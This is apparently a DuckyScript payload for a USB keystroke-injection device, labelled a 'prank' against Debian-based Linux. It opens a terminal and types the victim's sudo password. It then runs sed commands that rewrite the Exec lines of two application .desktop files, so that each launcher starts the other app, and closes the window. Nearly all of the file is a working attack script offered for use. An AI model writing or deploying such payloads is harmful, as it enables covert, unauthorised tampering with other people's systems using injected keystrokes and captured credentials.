REM_BLOCK
#######################################################
#                                                     #
# Title        : Change The App That Will Be Runned   #
# Author       : Aleff                                #
# Version      : 1.0                                  #
# Category     : Prank                                #
# Target       : GNU/Linux (Debian based tested)      #
#                                                     #
#######################################################

Requirements:
    - sudo permissions
END_REM

REM You must know the original desktop name file, if you don't know it you can rich this information download the app on you system and going to /usr/share/applications/ searching this one app, i.e. the desktop file name of Signal application is signal-desktop.desktop, so in this case you should put signal-desktop.desktop
DEFINE #ORIGINAL_DESKTOP_FILE_NAME_1 example
DEFINE #ORIGINAL_DESKTOP_EXEC_COMMAND_1 example
DEFINE #ORIGINAL_DESKTOP_FILE_NAME_2 example
DEFINE #ORIGINAL_DESKTOP_EXEC_COMMAND_2 example

REM sudo permissions needed
DEFINE #SUDO example

EXTENSION DETECT_READY
    REM VERSION 1.1
    REM AUTHOR: Korben

    REM_BLOCK DOCUMENTATION
        USAGE:
            Extension runs inline (here)
            Place at beginning of payload (besides ATTACKMODE) to act as dynamic
            boot delay

        TARGETS:
            Any system that reflects CAPSLOCK will detect minimum required delay
            Any system that does not reflect CAPSLOCK will hit the max delay of 3000ms
    END_REM

    REM CONFIGURATION:
    DEFINE #RESPONSE_DELAY 25
    DEFINE #ITERATION_LIMIT 120

    VAR $C = 0
    WHILE (($_CAPSLOCK_ON == FALSE) && ($C < #ITERATION_LIMIT))
        CAPSLOCK
        DELAY #RESPONSE_DELAY
        $C = ($C + 1)
    END_WHILE
    CAPSLOCK
END_EXTENSION

REM Open a shell
CTRL-ALT t
DELAY 1000

STRINGLN sudo sed -i '/^Exec=/s/.*/ #ORIGINAL_DESKTOP_EXEC_COMMAND_2 /' #ORIGINAL_DESKTOP_FILE_NAME_1
DELAY 500

STRINGLN #SUDO
DELAY 4000

STRINGLN sudo sed -i '/^Exec=/s/.*/#ORIGINAL_DESKTOP_EXEC_COMMAND_1/' #ORIGINAL_DESKTOP_FILE_NAME_2
DELAY 1000
ALT f4
